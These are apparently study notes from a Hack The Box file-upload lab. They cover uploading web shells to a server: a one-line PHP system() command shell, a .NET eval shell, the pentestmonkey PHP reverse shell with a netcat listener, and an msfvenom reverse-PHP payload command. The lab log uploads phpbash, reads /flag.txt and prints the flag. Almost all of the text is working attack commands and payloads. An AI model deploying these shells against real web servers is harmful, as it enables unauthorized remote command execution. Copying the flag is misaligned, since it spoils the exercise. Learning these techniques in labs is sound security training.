# Upload Exploitation

## Using common Web Shells

https://github.com/Arrexel/phpbash
https://github.com/danielmiessler/SecLists/tree/master/Web-Shells

/opt/useful/SecLists/Web-Shells

http://SERVER_IP:PORT/uploads/phpbash.php

## Writing Custom Web Shell

PHP :
<?php system($_REQUEST['cmd']); ?>
http://SERVER_IP:PORT/uploads/shell.php?cmd=id

.NET :
<% eval request('cmd') %>

## Reverse Shell

https://github.com/pentestmonkey/php-reverse-shell
https://github.com/danielmiessler/SecLists/tree/master/Web-Shells

git clone https://github.com/pentestmonkey/php-reverse-shell
cd php-reverse-shell
vi php-reverse-shell.php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS

nc -lvnp OUR_PORT

## Generating Custom Reverse Shell Scripts

msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php

nc -lvnp OUR_PORT

## LAB

git clone https://github.com/pentestmonkey/php-reverse-shell
cd php-reverse-shell
vi php-reverse-shell.php

$ip = '10.10.14.126';     // CHANGE THIS
$port = '1234';   // CHANGE THIS

http://83.136.253.251:48204/uploads/php-reverse-shell.php

nc -lvnp 1234

--> Failed

git clone https://github.com/Arrexel/phpbash
cd phpbash/

http://83.136.253.251:48204/uploads/phpbash.php

www-data@ng-786011-fileuploadsabsentverification-kiq02-58dfbf7cf7-nbljf
:/var/www/html/uploads# cat /flag.txt

HTB{g07_my_f1r57_w3b_5h3ll}